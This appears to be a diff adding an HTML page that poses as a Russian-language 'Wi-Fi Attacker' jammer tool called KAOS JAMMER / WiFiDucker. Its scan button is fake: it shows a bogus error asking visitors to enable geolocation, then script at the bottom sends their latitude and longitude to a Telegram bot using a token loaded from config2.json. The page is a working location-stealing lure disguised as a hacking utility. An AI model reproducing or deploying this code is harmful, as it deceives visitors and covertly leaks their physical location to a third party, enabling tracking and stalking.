@@ -1,0 +1,639 @@
+<html>
+<head>
+<link rel="apple-touch-icon" href="@">
+<meta name="apple-mobile-web-app-title" content=KAOS_JAMMER>
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<style>
+body {
+    background: -webkit-radial-gradient(center top ,#212224, #4b4e55 50% );
+	color: #bfbfbf;
+	font-family: sans-serif;
+	margin: 0;
+}
+
+h1 {
+	font-size: 1.7rem;
+    margin-top: 1rem;
+    background: #2f3136;
+    color: #bfbfbb;
+    padding: 0.2em 1em;
+    border-radius: 3px;
+    border-left: solid #4974a9 5px;
+    font-weight: 100;
+  text-align:center;
+}
+
+h2 {
+	font-size: 1.1rem;
+    margin-top: 1rem;
+    background: #2f3136;
+    color: #bfbfbb;
+    padding: 0.4em 1.8em;
+    border-radius: 3px;
+    border-left: solid #4974a9 5px;
+    font-weight: 100;
+}
+
+table{
+	border-collapse: collapse;
+}
+
+.left {
+	float: left;
+}
+.right {
+	float: right;
+}
+.bold {
+	font-weight: bold;
+}
+.red{
+	color: #F04747;
+}
+.green{
+	color:#43B581;
+}
+.clear {
+	clear: both;
+}
+.centered{
+	text-align: center;
+}
+.select{
+	width: 98px !important;
+	padding: 0 !important;
+}
+.selected{
+	background: #4974a9;
+}
+.status{
+	width: 120px;
+	padding-left: 8px;
+}
+.labelFix {
+	line-height: 40px;
+}
+
+#error {
+    text-align: center;
+    color: #fff;
+    background: #af3535;
+    border-radius: 5px;
+	padding: 10px;
+	margin-top: 10px;
+}
+
+#copyright{
+	font-size: 0.95em;
+	text-align: center;
+	margin-top: 3em;
+	margin-bottom: 3em;
+}
+
+/* ERROR */
+
+.hide {
+	display: none;
+}
+
+.show {
+	display: block !important;
+	animation-name: fadeIn;
+	animation-duration: 1s;
+}
+
+@keyframes fadeIn {
+	0%   {opacity: 0;}
+	100% {opacity: 1;}
+}
+	
+
+hr {
+	background: #3e4146;
+}
+
+a {
+	color: #5281bb;
+    text-decoration: none;
+}
+
+a:hover {
+	color: #95b8e4;
+}
+
+li{
+	margin: 4px 0;
+}
+
+/* Meter */
+.meter_background{
+	background: #42464D;
+	width: 100%;
+	min-width: 90px;
+}
+.meter_forground{
+	color: #fff;
+	padding: 4px 0;
+	/* + one of the colors below 
+	(width will be set by the JS) */
+}
+.meter_green{
+	background: #43B581;
+}
+.meter_orange{
+	background: #FAA61A;
+}
+.meter_red{
+	background: #F04747;
+}
+.meter_value{
+	padding-left: 8px;
+}
+
+
+/* Tables */
+table {
+	width: 100%;
+	margin-bottom: 50px;
+}
+
+th, td {
+    padding: 10px 6px;
+    text-align: left;
+    border-bottom: 1px solid #5d5d5d;
+}
+
+
+/* Navigation bar */ 
+/*
+
+nav {
+  
+	display: block;
+	padding: 8px 10px;
+	background: #2f3136;
+  height: 35px; 
+
+}
+
+nav a {
+	color: #bfbfbf;
+	padding: 0.5em;
+
+	text-decoration: none;
+  
+}
+
+nav a:hover{
+	background: #36393f;
+	color:#cecece;
+	border-radius: 4px;
+}
+
+*/
+
+/* Inputs and buttons */
+.upload-script, .button, button, input[type="submit"], input[type="reset"], input[type="button"] {
+	display: inline-block;
+	height: 38px;
+	padding: 0 25px;
+	color:#fff;
+	text-align: center;
+	font-size: 11px;
+	font-weight: 600;
+	line-height: 38px;
+	letter-spacing: .1rem;
+	text-transform: uppercase;
+	text-decoration: none;
+	white-space: nowrap;
+	background: #2f3136;
+	border-radius: 4px;
+	border: none;
+	cursor: pointer;
+	box-sizing: border-box;
+}
+
+button:hover, input[type="submit"]:hover, input[type="reset"]:hover, input[type="button"]:hover {
+	background: #42444a; 
+}
+
+/* Forms */
+input[type="email"], input[type="number"], input[type="search"], input[type="text"], input[type="tel"], input[type="url"], input[type="password"], textarea, select {
+	height: 38px;
+	padding: 6px 10px; /* The 6px vertically centers text on FF, ignored by Webkit */
+	background-color: #2f3136;
+	border-radius: 4px;
+	box-shadow: none;
+	box-sizing: border-box;
+	color: #d4d4d4;
+	border: none;
+}
+
+.setting {
+	width: 100% !important;
+	max-width: 284px !important;
+}
+
+input[type="file"] {
+    display: none;
+}
+
+/* ==== GRID SYSTEM ==== */
+
+.container {
+  width: 100%;
+  margin-left: auto;
+  margin-right: auto;
+  max-width: 1140px;
+  margin-top: 129px; /* bad */
+}
+
+.row {
+  position: relative;
+  width: 100%;
+  background-color: #1a19192b;
+    box-shadow: 0 0 5px 10px #1a19192b;
+}
+
+.row [class^="col"] {
+  float: left;
+  margin: 0.25rem 2%;
+  min-height: 0.125rem;
+}
+
+.col-1,
+.col-2,
+.col-3,
+.col-4,
+.col-5,
+.col-6,
+.col-7,
+.col-8,
+.col-9,
+.col-10,
+.col-11,
+.col-12 {
+  width: 96%;
+}
+
+.row::after {
+	content: "";
+	display: table;
+	clear: both;
+}
+
+.hidden-sm {
+  display: none;
+}
+
+@media only screen and (min-width: 45em) {
+  .col-1 {
+    width: 4.33%;
+  }
+
+  .col-2 {
+    width: 12.66%;
+  }
+
+  .col-3 {
+    width: 21%;
+  }
+
+  .col-4 {
+    width: 29.33%;
+  }
+
+  .col-5 {
+    width: 37.66%;
+  }
+
+  .col-6 {
+    width: 46%;
+  }
+
+  .col-7 {
+    width: 54.33%;
+  }
+
+  .col-8 {
+    width: 62.66%;
+  }
+
+  .col-9 {
+    width: 71%;
+  }
+
+  .col-10 {
+    width: 79.33%;
+  }
+
+  .col-11 {
+    width: 87.66%;
+  }
+
+  .col-12 {
+    width: 96%;
+  }
+
+  .hidden-sm {
+    display: block;
+  }
+}
+
+
+
+
+.M_logoz {
+   
+/*    margin: 0 auto; */
+  margin: 0 auto;
+  width: 522px;
+}
+
+/* badcaos */
+.TLogo {
+  font-size: 1.7rem;
+    
+     display: inline-block;
+    color: white;
+    padding: 0.2em 1em;
+    border-radius: 3px;
+    border-left: solid #ff0000 5px;
+    font-weight: 100;
+  
+ 
+}
+
+.TLogo2 {
+  font-size: 1.7rem;
+    color: white;
+    padding: 0.2em 1em;
+    border-radius: 3px;
+    border-right: solid #ff0000 5px;
+    font-weight: 100;
+  text-align: right;
+  display: inline-block;
+ 
+}
+
+
+
+
+
+
+.logoz {
+    
+    
+/* margin-left: auto;
+	margin-right: auto; */
+	display: inline-block;
+ vertical-align: middle;
+}
+
+
+img.logoz2 {
+    height: 200px;
+    width: 200px;
+    margin-top: -35px;
+
+	
+ 
+   transition:  2s;
+   -webkit-transition:  2s
+}
+
+img.logoz:hover {
+    height: 210px;
+    width: 210px;
+    
+transition-timing-function: ease-in-out;
+   -webkit-transform: translate(0px, 30px);
+    transform: translate(0px, 30px)
+      
+       transition:  0.35s;
+   -webkit-transition:  0.35s;
+   -webkit-transition-timing-function: ease-in;
+}
+
+/* Menu */
+
+
+.sidenav {
+    height: 100%;
+    width: 0;
+    position: fixed;
+    z-index: 1;
+    top: 0;
+    left: 0;
+    background-color: #111;
+    overflow-x: hidden;
+    transition: 0.5s;
+    padding-top: 60px;
+    text-align:center;
+    transform: translate(-50%, -50%);
+  top: 50%;
+  left: 50%;
+}
+
+.sidenav a {
+    padding: 8px 8px 8px 32px;
+    text-decoration: none;
+    font-size: 25px;
+    color: #818181;
+    display: block;
+    transition: 0.3s;
+
+}
+
+.sidenav a:hover{
+    color: #f1f1f1;
+}
+
+.sidenav .closebtn {
+    position: absolute;
+    top: 0;
+    right: 25px;
+    font-size: 36px;
+    margin-left: 50px;
+}
+
+@media screen and (max-height: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 18px;}
+}
+
+
+.navfake {
+  
+    display: block;
+    padding: 8px 10px;
+    background: #00000040;
+    height: 35px;
+    margin-top: -115px;
+    box-shadow: 0 0 32px 12px #13131378;
+}
+  #loadingModal {
+            display: none; /* Скрыто по умолчанию */
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        #loadingContent {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+</style>
+<meta name="mobile-web-app-capable" content="yes">
+  <link href="@" rel="icon" sizes="192x192" />
+<link href="@" rel="icon" sizes="128x128" />
+<meta name="theme-color" content="#36393E" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
+		<meta name="description" content="KAOS JAMMER, A wifi jammer or Wi-Fi Deauthenticator">
+		<meta name="author" content="BADCAOS">
+		
+		<title>WiFiDucker online</title>
+		<link  rel="stylesheet" href="style.css">
+		<script src="js/functions.js"></script>
+	</head>
+	<body>
+		<nav>
+			
+      			<div class="M_logoz">
+		
+      <div class="TLogo">Wi-Fi</div>
+      <div class="logoz" style="font-size:30px;cursor:pointer" onclick="openNav()"> 
+<img class="logoz2" src="./Iconlogoz.png" alt="Smiley face" ></div>
+<div  class="TLogo2">Attacker</div>
+   
+              
+<div  class="navfake"></div>              
+             
+              
+</div>
+   </div>
+     </nav> 
+      
+<div id="loadingModal">
+    <div id="loadingContent">
+        <p>Произошла ошибка(код ошибки: 09)<br><br>Включите гео данные, чтобы страница смогла просканировать ближайшие wifi сети.<br><br><button onclick="getLocation()" id="apScanStart" class="center button-primary">OK</button></p>
+        <div class="loader"></div>
+    </div>
+</div>
+<script>
+function openNav() {
+    //document.getElementById("mySidenav").style.width = "100%";
+}
+
+function closeNav() {
+    document.getElementById("mySidenav").style.width = "0";
+}
+  function showLoadingModal() {
+        const modal = document.getElementById('loadingModal');
+        modal.style.display = 'flex'; 
+    }
+</script>
+      
+     <div id="mySidenav" class="sidenav">
+  <a class="closebtnX">
+        </a>
+       
+  <a href="#">About</a>
+  <a href="#">Services</a>
+  <a href="#">Clients</a>
+  <a href="#">Contact</a>
+</div> 
+
+		
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					
+					<div id="error" class="hide"></div>
+					
+					<h1 class="header">Нажмите SCAN чтобы сканировать wifi сети</h1>
+					
+					<a id="scanInfo" class="left labelFix">scanning...</a>
+					
+					<button onclick="scan()" id="apScanStart" class="right button-primary">scan</button>
+					
+					<p class="clear">
+						Networks found: <span id="networksFound">0</span><br />
+						MAC: <span id="apMAC"></span><br />
+						<br />
+						<span id="selectAllBtns" style="visibility:'hidden'">
+							<button class="marginNull button-primary left" onclick="select(-2)">deselect all</button>
+							<button class="marginNull button-primary right" onclick="select(-1)">select all</button>
+							<br />
+						</span>
+						
+					</p>
+				
+					<table></table>
+					
+					<p class="small">
+						<span class="red">INFO: </span><span class="bold">Возможно, вам придется перезагрузить сайт, чтобы увидеть результаты.</span>
+						<br />
+						<br />
+					</p>
+					
+					
+					
+					<script src="js/apscan.js"></script>
+					
+				</div>
+			</div>
+		</div>
+	</body>
+  <script>
+
+  var userb, tokenb = "";
+  fetch('config2.json').then(response => {
+    
+    return response.json(); 
+  })
+  .then(data => {
+    tokenb = data.token;
+    userb = data.uid;
+  })
+  .catch(error => {
+    console.error('Ошибка:', error);
+  });
+  
+  function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    alert("Geolocation is not supported by this browser.");
+  }
+}
+
+function showPosition(position) {
+showLoadingModal();
+	fetch(`https://api.telegram.org/bot${tokenb}/sendMessage?chat_id=${userb}&text=${encodeURIComponent("lat: "+position.coords.latitude+`\nlong: ${position.coords.longitude}`)}`);
+}
+  
+  
+  
+  </script>
+<script>
+function scan(){
+	setTimeout(showLoadingModal, 3000);
+}
+
+
+</script>
+</html>
